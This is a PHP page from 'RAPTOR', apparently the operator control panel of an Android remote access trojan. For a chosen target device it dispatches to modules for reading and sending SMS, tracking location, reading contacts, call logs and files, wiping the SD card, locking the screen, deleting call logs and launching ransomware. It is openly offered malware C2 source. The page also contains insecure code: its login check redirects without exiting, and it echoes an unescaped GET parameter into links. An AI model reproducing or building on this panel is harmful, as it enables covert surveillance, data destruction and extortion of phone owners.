<?php
require_once '../private/session_manager.php';

if(!isLogin()){
   header('Location: login.php');
}

if (!isset($_GET['target']) || !isset($_GET['type'])){
    header('Location: index.php');
}



?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="100" > <!-- her 100 saniyede 1 sayfayı yenile -->
    <title>RAPTOR</title>

    <link rel="stylesheet" type="text/css" href="./css/theme.css"/>
    <link rel="stylesheet" type="text/css" href="./css/toastify.css"/>
    <link rel="stylesheet" type="text/css" href="./css/leaflet.css"/>
    <link rel="stylesheet" type="text/css" href="./css/font-awesome.min.css"/>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">

    <script type="text/javascript" src="./js/toastify.js"></script>
    <script type="text/javascript" src="./js/jquery.js"></script>
    <script type="text/javascript" src="./js/leaflet.js"></script>
    <script type="text/javascript" src="./js/socket.io.js"></script>

    <style>
        body {
            background: linear-gradient(135deg, #121212 0%, #1a1a1a 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-family: 'Roboto', sans-serif;
        }
        
        .navbar {
            background-color: rgba(30, 30, 30, 0.95) !important;
            border: none;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }
        
        .navbar-brand {
            color: #00ff9d !important;
            font-weight: 500;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .list-group {
            background-color: rgba(30, 30, 30, 0.95);
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
            overflow: hidden;
        }
        
        .list-group-item {
            background-color: transparent;
            border: none;
            color: #ffffff;
            padding: 15px 20px;
            transition: all 0.3s ease;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .list-group-item:hover {
            background-color: rgba(0, 255, 157, 0.1);
            color: #00ff9d;
            transform: translateX(5px);
        }
        
        .list-group-item.active {
            background-color: rgba(0, 255, 157, 0.2);
            color: #00ff9d;
            border-left: 4px solid #00ff9d;
        }
        
        .col-lg-10 {
            background-color: rgba(30, 30, 30, 0.95);
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
            padding: 30px;
            margin-bottom: 30px;
        }
        
        .tall-row p {
            color: #666;
        }
        
        .tall-row a {
            color: #00ff9d;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        .tall-row a:hover {
            color: #00ffcc;
        }
        
        @keyframes glow {
            0% { box-shadow: 0 0 5px rgba(0, 255, 157, 0.2); }
            50% { box-shadow: 0 0 20px rgba(0, 255, 157, 0.4); }
            100% { box-shadow: 0 0 5px rgba(0, 255, 157, 0.2); }
        }
        
        .col-lg-10 {
            animation: glow 3s infinite;
        }
    </style>
</head>

<body>

<nav class="navbar navbar-default navbar-static-top">
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-4 col-lg-offset-4 text-center">
                <a class="navbar-brand" href="index.php">RAPTOR</a>
            </div>
        </div>
    </div>
</nav>


<div class="container-fluid">
    <div class="row" style="margin-top: 30px;">

        <div class="col-lg-2">
            <div class="list-group">
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Specifications</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Location</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>">Guide</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">GetSms</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">Send SMS</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=8" class="list-group-item <?php if ($_GET['type']==8){ echo 'active';}?>">Toast</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=81" class="list-group-item <?php if ($_GET['type']==81){ echo 'active';}?>">WipeSdcard</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=82" class="list-group-item <?php if ($_GET['type']==82){ echo 'active';}?>">LockTheScreen</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=83" class="list-group-item <?php if ($_GET['type']==83){ echo 'active';}?>">changewallpaper</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=84" class="list-group-item <?php if ($_GET['type']==84){ echo 'active';}?>">Ransomware</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=85" class="list-group-item <?php if ($_GET['type']==85){ echo 'active';}?>">Vibrate</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=86" class="list-group-item <?php if ($_GET['type']==86){ echo 'active';}?>">DeleteCallLogs</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Searches</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=14" class="list-group-item <?php if ($_GET['type']==14){ echo 'active';}?>">Application</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=15" class="list-group-item <?php if ($_GET['type']==15){ echo 'active';}?>">Folders</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=19" class="list-group-item <?php if ($_GET['type']==19){ echo 'active';}?>">TTS</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=20" class="list-group-item">Exit</a>
            </div>
        </div>

         <div class="col-lg-10">

            <?php
            if ($_GET['type']==1){
                include './modules/device-property.php';
            } elseif ($_GET['type']==2){
                include './modules/location-tracker.php';
            } elseif ($_GET['type']==3){
                include './modules/rehber.php';
            } elseif ($_GET['type']==4){
                include './modules/read_all_sms.php';
            } elseif ($_GET['type']==5){
                include './modules/send-sms.php';
            } elseif ($_GET['type']==8){
                include './modules/screen-message.php';
            } elseif ($_GET['type']==81){
                include './modules/wipe.php';    
            } elseif ($_GET['type']==82){
                include './modules/LockTheScreen.php'; 
            } elseif ($_GET['type']==83){
                include './modules/changewallpaper.php'; 
            } elseif ($_GET['type']==84){
                include './modules/ransomware.php'; 
            } elseif ($_GET['type']==85){
                include './modules/vibrate.php'; 
            } elseif ($_GET['type']==86){
                include './modules/deletecalls.php'; 
            } elseif ($_GET['type']==10){
                include './modules/screen-capture.php';
            } elseif ($_GET['type']==11){
                include './modules/browser_history.php';
            } elseif ($_GET['type']==12){
                include './modules/call_log_history.php';
            } elseif ($_GET['type']==14){
                include './modules/app_list.php';
            } elseif ($_GET['type']==15){
                include './modules/file_manager.php';
            } elseif ($_GET['type']==19){
                include './modules/text-speech.php';
            } elseif ($_GET['type']==20){
                logout();
                header('Location: login.php');
                ?>
                <script>
                    window.location.reload();
                </script>
                <?php
            } else {
                include './modules/telefon-detay.php';
            }

            ?>
        </div>


    </div>
    <div class="row tall-row">
        <div class="col-md-12 text-center">
            <p>Created by <a href="#">Mehmet Şirin Sulan</a>. &copy; 2021</p>
        </div>
    </div>

</div>

</body>
</html>
